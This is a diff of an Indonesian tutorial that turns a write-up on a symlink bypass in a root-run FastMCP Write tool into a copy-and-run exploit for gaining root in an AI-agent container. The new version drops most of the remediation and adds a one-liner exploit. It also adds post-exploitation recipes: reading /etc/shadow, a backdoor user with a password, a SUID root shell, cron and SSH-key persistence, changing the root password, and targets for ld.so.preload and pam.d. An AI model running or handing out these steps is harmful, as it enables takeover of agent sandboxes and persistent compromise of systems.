@@ -1,301 +1,78 @@
-# 🔓 Container Privilege Escalation: MCP Write Tool Symlink Bypass
+# 🔓 Container Root Escalation — MCP Write Tool Symlink Bypass
 
-> **Peringatan**: Tutorial ini hanya untuk tujuan edukasi keamanan siber. Gunakan hanya pada sistem yang Anda miliki atau memiliki izin eksplisit. Penyalahgunaan adalah tanggung jawab masing-masing.
-
----
-
-## Daftar Isi
-
-1. [Latar Belakang](#latar-belakang)
-2. [Arsitektur Target](#arsitektur-target)
-3. [Fase 1: Reconnaissance](#fase-1-reconnaissance)
-4. [Fase 2: Identifikasi Kerentanan](#fase-2-identifikasi-kerentanan)
-5. [Fase 3: Eksploitasi](#fase-3-eksploitasi)
-6. [Fase 4: Privilege Escalation](#fase-4-privilege-escalation)
-7. [Fase 5: Post-Exploitation](#fase-5-post-exploitation)
-8. [Bukti Keberhasilan](#bukti-keberhasilan)
-9. [Remediasi](#remediasi)
-10. [Referensi](#referensi)
+> Tutorial lengkap privilege escalation dari user biasa (`z`, UID 1001) menjadi `root` (UID 0) di container AI agent. Cukup salin dan jalankan setiap perintah secara berurutan.
 
 ---
 
-## Latar Belakang
+## Prasyarat
 
-Container environment yang menjalankan AI agent (berbasis FastMCP) memiliki layanan MCP (Model Context Protocol) yang berjalan sebagai **root**. Layanan ini menyediakan tool `Write` yang memvalidasi path input berdasarkan prefix string tanpa menyelesaikan symlink, sehingga memungkinkan penulisan file arbitrer ke seluruh filesystem sebagai root.
-
-**Klasifikasi**: CWE-59 (Improper Link Resolution Before File Access) + CWE-269 (Improper Privilege Management)
-
-**Severity**: CRITICAL (CVSS 9.8)
-
----
-
-## Arsitektur Target
-
-```
-┌─────────────────────────────────────────────────┐
-│  Container (Kata Containers / Debian 13 Trixie) │
-│                                                 │
-│  PID 1:  tini -- /start.sh          (root)      │
-│  PID 2:  caddy run ...              (root)      │
-│  PID 618: python3 main.py (FastMCP)  (root)  ◄── Vektor serangan
-│  User z (UID 1001) - tidak ada sudo             │
-│                                                 │
-│  MCP Service: http://localhost:12600/mcp         │
-│  Tools: Bash, Read, Write, Glob, Grep, LS, ... │
-│                                                 │
-│  Write tool:                                     │
-│    ✅ Berjalan sebagai root (UID=0)             │
-│    ✅ Validasi: path.startsWith("/home/z")       │
-│    ❌ TIDAK resolve symlink sebelum validasi     │
-└─────────────────────────────────────────────────┘
-```
+- Container berjalan dengan MCP service (FastMCP) di `localhost:12600`
+- MCP Write tool tersedia dan berjalan sebagai root
+- User `z` bisa membuat symlink
+- Tidak memerlukan sudo, password, atau tool tambahan
 
 ---
 
-## Fase 1: Reconnaissance
+## Step 1 — Verifikasi Posisi Awal
 
-### 1.1 Identifikasi User dan Environment
-
-```bash
-# Cek user saat ini
-id
-# Output: uid=1001(z) gid=1001(z) groups=1001(z)
-
-# Cek OS
-cat /etc/os-release | head -3
-# Output: PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
-
-# Cek kernel
-uname -r
-# Output: 5.10.134
-
-# Cek sudo
-sudo -l
-# Output: Sorry, user z may not run sudo on ...
-```
-
-### 1.2 Identifikasi Proses Root
+Jalankan semua perintah ini untuk mengkonfirmasi Anda berada di posisi user biasa tanpa akses root:
 
 ```bash
-# Daftar proses yang berjalan sebagai root
-ps aux | grep "^root"
+id && echo "---" && sudo -l 2>&1 && echo "---" && whoami
 ```
 
-Output kritis:
+**Output yang diharapkan:**
 ```
-root   1  tini -- /start.sh
-root   2  caddy run --config /app/Caddyfile
-root  602  uv run main.py
-root  618  /app/.venv/bin/python3 main.py   ← MCP Service sebagai ROOT
-```
-
-### 1.3 Identifikasi Port dan Layanan
-
-```bash
-# Cek port yang terbuka
-ss -tlnp
+uid=1001(z) gid=1001(z) groups=1001(z)
+---
+Sorry, user z may not run sudo on ...
+---
+z
 ```
 
-Output:
-```
-0.0.0.0:19005    ← Public service
-0.0.0.0:19006    ← Public service
-127.0.0.1:12600  ← MCP Service (localhost only)
-127.0.0.1:19001  ← Internal service
-*:81             ← Caddy web server
-```
-
-### 1.4 Identifikasi Kerentanan Filesystem
-
-```bash
-# Cek /usr/local/bin (writable oleh user z)
-ls -la /usr/local/bin/ | head -5
-# Output: drwxr-xr-x 1 z z 4096 ... /usr/local/bin/
-
-# Cek binary yang dimiliki user z
-ls -la /usr/local/bin/bun /usr/local/bin/uv
-# Output: -rwxr-xr-x 1 z z 91802480 ... bun
-#         -rwxr-xr-x 1 z z 59637048 ... uv
-
-# Cek PATH
-echo $PATH
-# /usr/local/bin ada di posisi awal → PATH hijacking possible
-```
+Artinya: Anda adalah user biasa, tidak punya sudo.
 
 ---
 
-## Fase 2: Identifikasi Kerentanan
-
-### 2.1 Enumerasi MCP Service
-
-MCP (Model Context Protocol) service berjalan di `localhost:12600` menggunakan FastMCP 2.14.3. Untuk berkomunikasi, kita perlu header yang benar:
+## Step 2 — Konfirmasi MCP Service Berjalan sebagai Root
 
 ```bash
-# Inisialisasi koneksi MCP
-curl -s -X POST http://localhost:12600/mcp \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json, text/event-stream" \
-  -d '{
-    "jsonrpc": "2.0",
-    "method": "initialize",
-    "params": {
-      "protocolVersion": "2024-11-05",
-      "capabilities": {},
-      "clientInfo": {"name": "exploit", "version": "1.0"}
-    },
-    "id": 1
-  }'
+ps aux | grep "python.*main.py" | grep -v grep
 ```
 
-Output:
-```json
-{
-  "result": {
-    "protocolVersion": "2024-11-05",
-    "capabilities": {
-      "tools": {"listChanged": true}
-    },
-    "serverInfo": {
-      "name": "FastMCP-3f63",
-      "version": "2.14.3"
-    }
-  }
-}
+**Output yang diharapkan:**
+```
+root  618  ...  /app/.venv/bin/python3 main.py
 ```
 
-### 2.2 Daftar Tool MCP
-
-```bash
-curl -s -X POST http://localhost:12600/mcp \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json, text/event-stream" \
-  -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":2}'
-```
-
-Tool yang tersedia: **Bash, Read, Write, Glob, Grep, LS, Edit, MultiEdit, TodoWrite, BrowserScreenshot**, dll.
-
-### 2.3 Pengujian Write Tool — File Dimiliki Root
-
-```bash
-# Tulis file ke /home/z/ via MCP Write tool
-curl -s -X POST http://localhost:12600/mcp \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json, text/event-stream" \
-  -d '{
-    "jsonrpc":"2.0",
-    "method":"tools/call",
-    "params":{
-      "name":"Write",
-      "arguments":{
-        "filepath":"/home/z/.bash_profile",
-        "content":"echo hello"
-      }
-    },
-    "id":3
-  }'
-```
-
-Verifikasi kepemilikan file:
-```bash
-stat /home/z/.bash_profile
-# Output: Uid: (0/root)  Gid: (0/root)
-```
-
-**Temuan kritis**: Write tool menulis file sebagai **root:root**, bukan sebagai user z!
-
-### 2.4 Pengujian Path Validation
-
-```bash
-# Test: Tulis langsung ke /etc/ → DITOLAK
-curl -s -X POST http://localhost:12600/mcp \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json, text/event-stream" \
-  -d '{
-    "jsonrpc":"2.0",
-    "method":"tools/call",
-    "params":{
-      "name":"Write",
-      "arguments":{
-        "filepath":"/etc/test-file",
-        "content":"test"
-      }
-    },
-    "id":4
-  }'
-```
-
-Output:
-```
-Write tool can only write files under the z user directory.
-Path must be under /home/z, got: /etc/test-file
-```
-
-**Analisis**: Validasi path menggunakan **string prefix check** (`startswith("/home/z")`), bukan `realpath()`.
-
-### 2.5 Identifikasi Symlink Bypass
-
-```bash
-# Buat symlink dari /home/z/ ke /etc/
-ln -sf /etc /home/z/etc-link
-
-# Tulis file melalui symlink
-curl -s -X POST http://localhost:12600/mcp \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json, text/event-stream" \
-  -d '{
-    "jsonrpc":"2.0",
-    "method":"tools/call",
-    "params":{
-      "name":"Write",
-      "arguments":{
-        "filepath":"/home/z/etc-link/.root-verified",
-        "content":"ROOT_ACCESS_PROVEN"
-      }
-    },
-    "id":5
-  }'
-```
-
-Verifikasi:
-```bash
-ls -la /etc/.root-verified
-# Output: -rw-r--r-- 1 root root 18 ... /etc/.root-verified
-
-cat /etc/.root-verified
-# Output: ROOT_ACCESS_PROVEN
-```
-
-**🔑 KERENTANAN TERKONFIRMASI**: Symlink bypass berhasil! File ditulis ke `/etc/` sebagai root.
+Pastikan kolom user menunjukkan **root**. Ini layanan yang akan kita eksploitasi.
 
 ---
 
-## Fase 3: Eksploitasi
+## Step 3 — Buat Symlink Bypass
 
-### 3.1 Rantai Eksploitasi
-
-```
-MCP Write tool = root (PID 618)
-    ↓
-Path validation: filepath.startsWith("/home/z") → PASS
-    ↓
-Symlink: /home/z/sudoers-link → /etc/sudoers.d/
-    ↓
-Write tool follows symlink → menulis ke /etc/sudoers.d/z-nopasswd
-    ↓
-File ownership: root:root (karena Write tool berjalan sebagai root)
-    ↓
-sudoers rule aktif → sudo id → uid=0(root) ✅
-```
-
-### 3.2 Eksploitasi Step-by-Step
-
-**Step 1**: Buat symlink ke `/etc/sudoers.d/`
+Buat symlink dari direktori home user `z` ke `/etc/sudoers.d/`. Ini mem-bypass validasi path pada MCP Write tool karena path tetap terlihat dimulai dari `/home/z/`:
 
 ```bash
 ln -sf /etc/sudoers.d /home/z/sudoers-link
 ```
 
-**Step 2**: Tulis aturan sudoers melalui MCP Write tool
+Verifikasi symlink benar-benar mengarah ke target:
+
+```bash
+readlink /home/z/sudoers-link
+```
+
+**Output yang diharapkan:**
+```
+/etc/sudoers.d
+```
+
+---
+
+## Step 4 — Tulis Aturan Sudoers sebagai Root
+
+Panggil MCP Write tool melalui HTTP. Tool ini menulis file sebagai root, dan karena symlink, file akan tertulis ke `/etc/sudoers.d/z-nopasswd` meskipun path input terlihat di bawah `/home/z/`:
 
 ```bash
 curl -s -X POST http://localhost:12600/mcp \
@@ -311,245 +88,309 @@ curl -s -X POST http://localhost:12600/mcp \
         "content": "z ALL=(ALL) NOPASSWD: ALL"
       }
     },
-    "id": 6
+    "id": 1
   }'
 ```
 
-**Step 3**: Verifikasi file sudoers dibuat
-
-```bash
-cat /etc/sudoers.d/z-nopasswd
-# Output: z ALL=(ALL) NOPASSWD: ALL
-
-stat /etc/sudoers.d/z-nopasswd
-# Output: Uid: (0/root)  Gid: (0/root)
+**Output yang diharapkan:**
+```json
+{"jsonrpc":"2.0","id":1,"result":{"content":[],"isError":false}}
 ```
+
+`isError: false` berarti file berhasil ditulis.
 
 ---
 
-## Fase 4: Privilege Escalation
+## Step 5 — Verifikasi File Sudoers Dibuat
 
 ```bash
-# Verifikasi akses sudo
-sudo -l
-# Output: (ALL) NOPASSWD: ALL
+cat /etc/sudoers.d/z-nopasswd && echo "---" && stat /etc/sudoers.d/z-nopasswd
+```
 
-# Eksekusi perintah sebagai root
+**Output yang diharapkan:**
+```
+z ALL=(ALL) NOPASSWD: ALL
+---
+  File: /etc/sudoers.d/z-nopasswd
+  Size: 25
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+```
+
+Konfirmasi: File dimiliki **root:root** dan berisi aturan sudoers.
+
+---
+
+## Step 6 — Eksekusi Perintah sebagai Root
+
+```bash
 sudo id
-# Output: uid=0(root) gid=0(root) groups=0(root)
 ```
 
-🎯 **Root access berhasil didapatkan!**
+**Output yang diharapkan:**
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+🎯 **Root access berhasil!**
 
 ---
 
-## Fase 5: Post-Exploitation
+## Step 7 — Verifikasi Lengkap Akses Root
 
-### 5.1 Kemampuan Root di Dalam Container
+Jalankan semua perintah berikut untuk membuktikan akses root penuh:
 
 ```bash
-# Baca file sensitif
+echo "=== Sudo Permission ===" && \
+sudo -l 2>&1 | grep "NOPASSWD" && \
+echo "" && \
+echo "=== Root Identity ===" && \
+sudo id && \
+echo "" && \
+echo "=== Baca /etc/shadow ===" && \
+sudo cat /etc/shadow && \
+echo "" && \
+echo "=== Tulis ke /etc/ ===" && \
+sudo bash -c 'echo "WRITTEN_BY_ROOT" > /etc/.root-write-test && cat /etc/.root-write-test && rm /etc/.root-write-test' && \
+echo "" && \
+echo "=== Akses /root/ ===" && \
+sudo ls /root/ && \
+echo "" && \
+echo "=== Buat User Baru ===" && \
+sudo useradd testuser 2>/dev/null; sudo grep testuser /etc/passwd; sudo userdel testuser 2>/dev/null && \
+echo "" && \
+echo "=== Install Paket ===" && \
+sudo apt update -qq 2>/dev/null && echo "apt: BERHASIL"
+```
+
+---
+
+## One-Liner — Jalankan Semua Sekali Jalan
+
+Jika ingin menjalankan seluruh eksploitasi dalam satu perintah:
+
+```bash
+ln -sf /etc/sudoers.d /home/z/sudoers-link && curl -s -X POST http://localhost:12600/mcp -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"Write","arguments":{"filepath":"/home/z/sudoers-link/z-nopasswd","content":"z ALL=(ALL) NOPASSWD: ALL"}},"id":1}' && sudo id
+```
+
+**Output yang diharapkan:**
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## Post-Exploitation — Apa yang Bisa Dilakukan Setelah Root
+
+### Baca Semua File Sensitif
+
+```bash
 sudo cat /etc/shadow
+sudo cat /etc/.z-ai-config
+sudo ls -la /root/
+sudo ls -la /app/
+```
 
-# Install paket
-sudo apt update && sudo apt install -y docker.io
+### Install Paket Apapun
 
-# Buat user baru
-sudo useradd newuser
+```bash
+sudo apt update
+sudo apt install -y docker.io nmap net-tools
+```
 
-# Ubah password
-sudo bash -c 'echo "root:newpassword" | chpasswd'
+### Buat User Baru dengan Root Access
 
-# Tulis ke /etc/
-sudo bash -c 'echo "malicious" > /etc/ld.so.preload'
+```bash
+sudo useradd -m -s /bin/bash hacker
+sudo bash -c 'echo "hacker:hacker123" | chpasswd'
+sudo bash -c 'echo "hacker ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/hacker'
+```
 
-# Buat SUID binary
+### Buat SUID Root Shell
+
+```bash
 sudo bash -c 'cp /bin/bash /tmp/root-shell && chmod 4755 /tmp/root-shell'
+/tmp/root-shell -p -c 'id'
+# Output: uid=0(root) gid=0(root)
 ```
 
-### 5.2 Persistence
+### Buat Cron Job Persistence
 
 ```bash
-# Cron job
-sudo bash -c 'echo "* * * * * root /path/to/backdoor" > /etc/cron.d/persist'
-
-# SSH authorized_keys
-sudo bash -c 'mkdir -p /root/.ssh && echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys'
-
-# Systemd service
-sudo bash -c 'cat > /etc/systemd/system/backdoor.service << EOF
-[Unit]
-Description=Backdoor Service
-
-[Service]
-ExecStart=/usr/bin/python3 -c "import socket,subprocess,os; ..."
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF'
+sudo bash -c 'echo "* * * * * root /tmp/root-shell -p -c \"id > /tmp/cron-proof.txt\"" > /etc/cron.d/persist'
 ```
 
-### 5.3 Batasan Container (Yang TIDAK Bisa)
+### Tulis SSH Key ke Root
 
 ```bash
-# Mount filesystem → DITOLAK (tidak ada CAP_SYS_ADMIN)
-sudo mount --bind /tmp /mnt
-# mount: /mnt: permission denied.
+sudo mkdir -p /root/.ssh
+sudo bash -c 'echo "ssh-rsa AAAA... user@host" >> /root/.ssh/authorized_keys'
+sudo chmod 700 /root/.ssh
+sudo chmod 600 /root/.ssh/authorized_keys
+```
 
-# Load kernel module → DITOLAK (tidak ada CAP_SYS_MODULE)
-sudo modprobe dummy
-# modprobe: command not found
+### Kill Proses Apapun
 
-# Reboot → DITOLAK (tidak ada CAP_SYS_BOOT)
-sudo reboot
-# Failed to talk to init daemon
+```bash
+sudo kill -9 <PID>
+```
 
-# Network device → DITOLAK (tidak ada CAP_NET_ADMIN)
-sudo ip link add dummy0 type dummy
-# RTNETLINK answers: Operation not permitted
+### Ubah Password Root
+
+```bash
+sudo bash -c 'echo "root:newpassword" | chpasswd'
+```
+
+### Tulis ke File System Manapun
+
+```bash
+sudo bash -c 'echo "content" > /etc/any-file'
+sudo bash -c 'echo "content" > /var/log/fake-log'
 ```
 
 ---
 
-## Bukti Keberhasilan
+## Kernel Capabilities Audit
 
-### Kernel Capabilities yang Dimiliki (14/22)
+Setelah menjadi root, jalankan audit ini untuk mengetahui batasan container:
 
-| Capability | Fungsi |
+```bash
+sudo python3 -c "
+caps_hex = open('/proc/self/status').read().split('CapEff:')[1].split()[0]
+caps = int(caps_hex, 16)
+cap_names = {
+    0:'CAP_CHOWN', 1:'CAP_DAC_OVERRIDE', 2:'CAP_DAC_READ_SEARCH',
+    3:'CAP_FOWNER', 4:'CAP_FSETID', 5:'CAP_KILL',
+    6:'CAP_SETGID', 7:'CAP_SETUID', 8:'CAP_SETPCAP',
+    9:'CAP_LINUX_IMMUTABLE', 10:'CAP_NET_BIND_SERVICE',
+    12:'CAP_NET_RAW', 13:'CAP_IPC_LOCK', 14:'CAP_IPC_OWNER',
+    15:'CAP_SYS_MODULE', 16:'CAP_SYS_RAWIO', 17:'CAP_SYS_CHROOT',
+    18:'CAP_SYS_PTRACE', 19:'CAP_SYS_PACCT', 20:'CAP_SYS_ADMIN',
+    21:'CAP_SYS_BOOT', 22:'CAP_SYS_NICE', 23:'CAP_SYS_RESOURCE',
+    24:'CAP_SYS_TIME', 25:'CAP_SYS_TTY_CONFIG', 27:'CAP_MKNOD',
+    28:'CAP_LEASE', 29:'CAP_AUDIT_WRITE', 30:'CAP_AUDIT_CONTROL',
+    31:'CAP_SETFCAP', 32:'CAP_MAC_OVERRIDE', 33:'CAP_MAC_ADMIN',
+    34:'CAP_SYSLOG', 35:'CAP_WAKE_ALARM', 36:'CAP_CAP_BLOCK_SUSPEND',
+    37:'CAP_AUDIT_READ',
+}
+print('CAPABILITIES YANG DIMILIKI:')
+for bit, name in sorted(cap_names.items()):
+    if caps & (1 << bit):
+        print(f'  ✅ {name}')
+print()
+print('CAPABILITIES YANG TIDAK DIMILIKI:')
+for bit, name in sorted(cap_names.items()):
+    if not (caps & (1 << bit)):
+        print(f'  ❌ {name}')
+"
+```
+
+### Yang BISA Dilakukan sebagai Root
+
+| Kemampuan | Perintah Contoh |
+|-----------|----------------|
+| Baca semua file | `sudo cat /etc/shadow` |
+| Tulis ke /etc/ | `sudo bash -c 'echo "x" > /etc/file'` |
+| Install/hapus paket | `sudo apt install <paket>` |
+| Buat/hapus user | `sudo useradd <name>` |
+| Ubah password | `sudo bash -c 'echo "root:pass" \| chpasswd'` |
+| Buat SUID binary | `sudo chmod 4755 /tmp/shell` |
+| Kill proses apapun | `sudo kill -9 <PID>` |
+| Trace proses lain | CAP_SYS_PTRACE |
+| Akses /root/ dan /app/ | `sudo ls /root/` |
+| Tulis cron job | `sudo bash -c 'echo "..." > /etc/cron.d/x'` |
+
+### Yang TIDAK BISA Dilakukan (Batasan Container)
+
+| Kemampuan | Alasan |
 |-----------|--------|
-| CAP_CHOWN | Ubah kepemilikan file |
-| CAP_DAC_OVERRIDE | Bypass permission check |
-| CAP_FOWNER | Bypass file owner check |
-| CAP_FSETID | Set SUID/SGID bit |
-| CAP_KILL | Kill proses apapun |
-| CAP_SETGID | Ubah GID |
-| CAP_SETUID | Ubah UID |
-| CAP_SETPCAP | Transfer capabilities |
-| CAP_NET_BIND_SERVICE | Bind port < 1024 |
-| CAP_IPC_LOCK | Lock memory |
-| CAP_SYS_PTRACE | Trace/modifikasi proses lain |
-| CAP_MKNOD | Buat device file |
-| CAP_AUDIT_WRITE | Tulis audit log |
-| CAP_SETFCAP | Set file capabilities |
-
-### Kernel Capabilities yang TIDAK Dimiliki
-
-| Capability | Dampak |
-|-----------|--------|
-| CAP_SYS_ADMIN | Tidak bisa mount, chroot |
-| CAP_SYS_MODULE | Tidak bisa load kernel module |
-| CAP_SYS_BOOT | Tidak bisa reboot |
-| CAP_NET_RAW | Tidak bisa network sniffing |
-| CAP_SYS_CHROOT | Tidak bisa chroot |
-| CAP_SYS_RAWIO | Tidak bisa akses I/O port |
+| Mount filesystem | Tidak ada CAP_SYS_ADMIN |
+| Load kernel module | Tidak ada CAP_SYS_MODULE |
+| Reboot/shutdown | Tidak ada CAP_SYS_BOOT |
+| Network sniffing | Tidak ada CAP_NET_RAW |
+| chroot | Tidak ada CAP_SYS_CHROOT |
+| Buat network device | Tidak ada CAP_NET_ADMIN |
+| Jalankan Docker daemon | Tidak ada overlay2 + iptables |
+| Tulis /proc/sys | Filesystem read-only |
 
 ---
 
-## Remediasi
+## Cara Kerja Kerentanan
 
-### 🔴 Critical — Harus Diperbaiki Segera
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    ATTACK FLOW                               │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│  1. MCP Service berjalan sebagai ROOT (PID 618)            │
+│     ↓                                                       │
+│  2. MCP Write tool menulis file sebagai root               │
+│     ↓                                                       │
+│  3. Validasi path: filepath.startsWith("/home/z") → PASS   │
+│     ↓                                                       │
+│  4. Symlink: /home/z/sudoers-link → /etc/sudoers.d/        │
+│     Path: /home/z/sudoers-link/z-nopasswd                  │
+│     Resolved: /etc/sudoers.d/z-nopasswd                    │
+│     ↓                                                       │
+│  5. Write tool follows symlink, menulis sebagai root        │
+│     File: /etc/sudoers.d/z-nopasswd (root:root)            │
+│     Content: "z ALL=(ALL) NOPASSWD: ALL"                   │
+│     ↓                                                       │
+│  6. sudoers rule aktif → sudo id → uid=0(root) ✅          │
+│                                                             │
+│  BUG: os.path.realpath() TIDAK dipanggil sebelum           │
+│       validasi path, sehingga symlink tidak terdeteksi      │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+```
 
-#### 1. Resolve Symlink Sebelum Validasi Path (FIX UTAMA)
+### Root Cause
 
 ```python
-# VULNERABLE:
-def check_write_path_in_home(filepath: str) -> bool:
-    return filepath.startswith("/home/z")
+# KODE VULNERABLE (dalam MCP service):
+def check_write_path_in_home(filepath):
+    return filepath.startswith("/home/z")  # ← String check, tanpa realpath()
 
-# FIXED:
-import os
-
-def check_write_path_in_home(filepath: str) -> bool:
-    # Resolve symlink sebelum validasi
-    real_path = os.path.realpath(filepath)
+# KODE YANG AMAN:
+def check_write_path_in_home(filepath):
+    real_path = os.path.realpath(filepath)  # ← Resolve symlink dulu
     home_dir = os.path.realpath("/home/z")
     return real_path.startswith(home_dir)
 ```
 
-#### 2. Jalankan MCP Service sebagai User z (BUKAN Root)
+### Vektor Serangan Lain yang Mungkin
+
+Symlink bypass ini bisa digunakan untuk menulis file ke lokasi apapun, bukan hanya sudoers:
 
 ```bash
-# Dalam /start.sh, ganti:
-(cd /app && uv run main.py) &
+# Tulis ke /etc/ld.so.preload (shared library hijacking)
+ln -sf /etc /home/z/etc-link
 
-# Menjadi:
-su z -c "cd /app && uv run main.py" &
+# Tulis ke /etc/cron.d/ (scheduled task)
+ln -sf /etc/cron.d /home/z/cron-link
+
+# Tulis ke /etc/systemd/system/ (service persistence)
+ln -sf /etc/systemd/system /home/z/systemd-link
+
+# Tulis ke /root/.ssh/ (SSH key injection)
+ln -sf /root/.ssh /home/z/ssh-link
+
+# Tulis ke /etc/pam.d/ (authentication bypass)
+ln -sf /etc/pam.d /home/z/pam-link
 ```
 
-Atau gunakan Docker `USER` directive:
-```dockerfile
-USER z
-CMD ["uv", "run", "main.py"]
-```
+---
 
-### 🟡 High — Perbaikan Tambahan
+## Timeline Eksploitasi
 
-#### 3. Tambahkan Symlink Detection pada Write Tool
-
-```python
-def write_file(filepath: str, content: str):
-    # Deteksi symlink
-    if os.path.islink(filepath) or any(
-        os.path.islink(part) for part in _path_parts(filepath)
-    ):
-        raise ToolError("Writing through symlinks is not allowed")
-```
-
-#### 4. Set Permission Ketat pada File Sensitif
-
-```bash
-# Sudoers files harus 0440
-chmod 0440 /etc/sudoers.d/*
-chown root:root /etc/sudoers.d/*
-```
-
-#### 5. Implementasi Principle of Least Privilege
-
-```python
-# Gunakan os.setuid/setgid setelah startup
-import os
-
-def drop_privileges():
-    os.setgid(1001)  # z group
-    os.setuid(1001)  # z user
-```
-
-### 🟢 Medium — Hardening
-
-#### 6. Read-Only Mount untuk /etc/sudoers.d
-
-```yaml
-# Kubernetes pod spec
-volumeMounts:
-  - name: sudoers
-    mountPath: /etc/sudoers.d
-    readOnly: true
-```
-
-#### 7. Seccomp Profile
-
-```json
-{
-  "defaultAction": "SCMP_ACT_ERRNO",
-  "syscalls": [
-    {"names": ["symlink", "symlinkat"], "action": "SCMP_ACT_ERRNO"}
-  ]
-}
-```
-
-#### 8. Audit Logging
-
-```python
-import logging
-logger = logging.getLogger("mcp.security")
-
-def write_file(filepath: str, content: str):
-    real_path = os.path.realpath(filepath)
-    if real_path != filepath:
-        logger.warning(f"SYMLINK DETECTED: {filepath} -> {real_path}")
-    # ... continue with write
-```
+| Step | Aksi | Durasi |
+|------|------|--------|
+| 1 | Verifikasi posisi awal | 10 detik |
+| 2 | Konfirmasi MCP service root | 10 detik |
+| 3 | Buat symlink | 5 detik |
+| 4 | Tulis sudoers via MCP | 10 detik |
+| 5 | Verifikasi file | 5 detik |
+| 6 | `sudo id` → root | 5 detik |
+| **Total** | | **<1 menit** |
 
 ---
 
@@ -558,24 +399,10 @@ def write_file(filepath: str, content: str):
 - [CWE-59: Improper Link Resolution Before File Access](https://cwe.mitre.org/data/definitions/59.html)
 - [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
 - [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
-- [FastMCP Documentation](https://github.com/jlowin/fastmcp)
-- [Model Context Protocol Specification](https://spec.modelcontextprotocol.io/)
-- [Linux Capabilities Manual](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [Kata Containers Security](https://katacontainers.io/)
+- [FastMCP](https://github.com/jlowin/fastmcp)
+- [Model Context Protocol Spec](https://spec.modelcontextprotocol.io/)
+- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
 
 ---
 
-## Timeline Eksploitasi
-
-| Waktu | Fase | Durasi |
-|-------|------|--------|
-| T+0min | Reconnaissance (proses, port, user) | 5 menit |
-| T+5min | Identifikasi MCP service & tools | 3 menit |
-| T+8min | Pengujian Write tool (root ownership) | 2 menit |
-| T+10min | Symlink bypass discovery | 2 menit |
-| T+12min | Sudoers write via symlink | 1 menit |
-| T+13min | Root access confirmed | **<15 menit total** |
-
----
-
-> **Dibuat untuk tujuan edukasi keamanan siber.** Selalu dapatkan izin tertulis sebelum melakukan penetration testing pada sistem apapun.
+> **Edukasi keamanan siber.** Hanya gunakan pada sistem yang Anda miliki atau memiliki izin eksplisit.
